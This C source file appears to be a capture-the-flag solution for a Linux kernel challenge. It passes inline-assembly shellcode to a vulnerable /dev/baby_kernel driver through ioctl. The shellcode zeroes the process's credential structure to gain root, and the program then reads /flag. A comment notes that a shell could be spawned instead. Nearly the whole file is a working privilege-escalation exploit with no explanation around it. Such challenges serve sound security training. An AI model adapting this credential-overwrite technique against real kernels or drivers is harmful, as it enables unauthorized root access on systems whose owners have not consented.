#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define BABY_KERNEL_IOCTL   0xffffffffc00000c0

const char* argv[] = {"/bin/chown\0", "1000;1000\0", "/flag\0", NULL};

// Setting all the fields of the struct creds to 0, so to become root (only during the execution of this program, so we have either to open/read/write file flag or to spawn a shell before exiting the exploit)
void shellcode_1()
{
    asm volatile (
        "mov rdi, gs:0x1AD00\n"
        "mov rsi, [rdi+0x740]\n"
        "mov qword ptr [rsi+0x8], 0\n"
        "mov qword ptr [rsi+0x10], 0\n"
        "mov qword ptr [rsi+0x18], 0\n"
        "mov qword ptr [rsi+0x20], 0\n"
    );
}

int main()
{
    int fd;
    char buf[100];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    fd = open("/dev/baby_kernel", O_RDWR);

    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    printf("File opened: fd = %d\n", fd);
    ioctl(fd, 1337, shellcode_1);
    close(fd);
    fd = open("/flag", O_RDONLY);

    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    read(fd, buf, sizeof(buf));
    printf("Flag: %s\n", buf);
    close(fd);

    return 0;
}